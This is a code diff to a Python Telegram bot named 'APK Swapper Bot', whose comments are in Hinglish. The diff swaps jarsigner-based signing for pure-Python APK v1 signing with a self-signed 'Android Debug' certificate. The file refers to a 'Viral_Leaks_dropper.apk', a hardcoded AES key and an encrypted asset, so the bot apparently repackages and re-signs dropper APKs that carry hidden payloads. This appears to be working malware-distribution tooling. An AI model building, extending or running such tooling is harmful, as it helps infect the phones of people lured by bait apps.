@@ -2,7 +2,7 @@
 APK Swapper Bot — Full version with menu + auto-signing
 """
 
-import os, io, zipfile, secrets, logging, asyncio, subprocess, tempfile, shutil
+import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -18,13 +18,11 @@ from telegram.ext import (
 
 BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
 DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
-KEYSTORE     = Path(__file__).parent / "debug.keystore"
+KEY_PATH     = Path(__file__).parent / "sign.key"
+CERT_PATH    = Path(__file__).parent / "sign.crt"
 AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
 AES_KEY      = bytes.fromhex(AES_KEY_HEX)
 ASSET_NAME   = "assets/Axyra"
-
-KS_PASS  = "android"
-KS_ALIAS = "androiddebugkey"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -32,52 +30,126 @@ logging.basicConfig(
 )
 log = logging.getLogger(__name__)
 
-# ─── Signing ──────────────────────────────────────────────────────────────────
+# ─── Pure-Python APK v1 signing (no Java needed) ─────────────────────────────
 
-def _jarsigner_available() -> bool:
-    return shutil.which("jarsigner") is not None
+def _load_or_create_key_cert():
+    try:
+        from cryptography import x509
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.x509.oid import NameOID
+    except ImportError:
+        return None, None
 
-def ensure_keystore():
-    if KEYSTORE.exists():
-        return
-    log.info("Keystore nahi mili — generate kar raha hoon...")
-    subprocess.run([
-        "keytool", "-genkeypair", "-v",
-        "-keystore", str(KEYSTORE),
-        "-alias", KS_ALIAS,
-        "-keyalg", "RSA", "-keysize", "2048",
-        "-validity", "10000",
-        "-storepass", KS_PASS,
-        "-keypass",   KS_PASS,
-        "-dname", "CN=Android Debug,O=Android,C=US",
-    ], check=True, capture_output=True)
-    log.info("Keystore bani: %s", KEYSTORE)
+    if KEY_PATH.exists() and CERT_PATH.exists():
+        key  = serialization.load_pem_private_key(KEY_PATH.read_bytes(), password=None)
+        cert = x509.load_pem_x509_certificate(CERT_PATH.read_bytes())
+        return key, cert
+
+    log.info("Signing key generate kar raha hoon...")
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    KEY_PATH.write_bytes(key.private_bytes(
+        serialization.Encoding.PEM,
+        serialization.PrivateFormat.PKCS8,
+        serialization.NoEncryption()
+    ))
+    name = x509.Name([
+        x509.NameAttribute(NameOID.COMMON_NAME,         "Android Debug"),
+        x509.NameAttribute(NameOID.ORGANIZATION_NAME,   "Android"),
+        x509.NameAttribute(NameOID.COUNTRY_NAME,        "US"),
+    ])
+    now  = datetime.datetime.utcnow()
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(name).issuer_name(name)
+        .public_key(key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(now)
+        .not_valid_after(now + datetime.timedelta(days=10000))
+        .sign(key, hashes.SHA256())
+    )
+    CERT_PATH.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
+    log.info("Key + cert saved.")
+    return key, cert
+
+
+def _b64(b: bytes) -> str:
+    return base64.b64encode(b).decode()
+
+
+def _build_manifest(entries: list[tuple[str, bytes]]) -> bytes:
+    lines = ["Manifest-Version: 1.0\r\nCreated-By: 1.0 (Python)\r\n\r\n"]
+    for name, data in entries:
+        digest = _b64(hashlib.sha256(data).digest())
+        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
+    return "".join(lines).encode()
+
+
+def _build_sf(manifest: bytes, sections: list[tuple[str, bytes]]) -> bytes:
+    mf_digest = _b64(hashlib.sha256(manifest).digest())
+    lines = [
+        f"Signature-Version: 1.0\r\n"
+        f"Created-By: 1.0 (Python)\r\n"
+        f"SHA-256-Digest-Manifest: {mf_digest}\r\n\r\n"
+    ]
+    for name, sect_bytes in sections:
+        digest = _b64(hashlib.sha256(sect_bytes).digest())
+        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
+    return "".join(lines).encode()
+
 
 def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
-    """Returns (signed_bytes, was_signed). If jarsigner missing, returns original."""
-    if not _jarsigner_available():
-        log.warning("jarsigner nahi mila — unsigned return kar raha hoon")
+    try:
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.serialization import pkcs7
+    except ImportError:
+        log.warning("cryptography lib nahi — pip install cryptography karo")
         return apk_bytes, False
 
-    ensure_keystore()
+    key, cert = _load_or_create_key_cert()
+    if key is None:
+        return apk_bytes, False
 
-    tmp = Path(tempfile.mktemp(suffix=".apk"))
-    try:
-        tmp.write_bytes(apk_bytes)
-        subprocess.run([
-            "jarsigner",
-            "-keystore",   str(KEYSTORE),
-            "-storepass",  KS_PASS,
-            "-keypass",    KS_PASS,
-            "-sigalg",     "SHA256withRSA",
-            "-digestalg",  "SHA-256",
-            "-sigfile",    "CERT",
-            str(tmp),
-            KS_ALIAS,
-        ], check=True, capture_output=True)
-        return tmp.read_bytes(), True
-    finally:
-        tmp.unlink(missing_ok=True)
+    # Read all non-META-INF entries
+    zin = zipfile.ZipFile(io.BytesIO(apk_bytes))
+    entries = []
+    for item in zin.infolist():
+        if item.filename.startswith("META-INF/"):
+            continue
+        entries.append((item.filename, zin.read(item.filename)))
+
+    # Build MANIFEST.MF
+    manifest = _build_manifest(entries)
+
+    # Build per-entry section bytes for CERT.SF
+    sf_sections = []
+    for name, data in entries:
+        digest = _b64(hashlib.sha256(data).digest())
+        sect = f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n".encode()
+        sf_sections.append((name, sect))
+
+    cert_sf = _build_sf(manifest, sf_sections)
+
+    # PKCS#7 / CMS signature over CERT.SF
+    cert_rsa = (
+        pkcs7.PKCS7SignatureBuilder()
+        .set_data(cert_sf)
+        .add_signer(cert, key, hashes.SHA256())
+        .sign(serialization.Encoding.DER, [pkcs7.PKCS7Options.DetachedSignature])
+    )
+
+    # Rebuild ZIP with META-INF
+    out = io.BytesIO()
+    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_DEFLATED) as zout:
+        for name, data in entries:
+            zout.writestr(name, data)
+        zout.writestr("META-INF/MANIFEST.MF", manifest)
+        zout.writestr("META-INF/CERT.SF",     cert_sf)
+        zout.writestr("META-INF/CERT.RSA",    cert_rsa)
+
+    zin.close()
+    log.info("APK signed (v1/JAR, pure Python)")
+    return out.getvalue(), True
 
 # ─── State ────────────────────────────────────────────────────────────────────
 
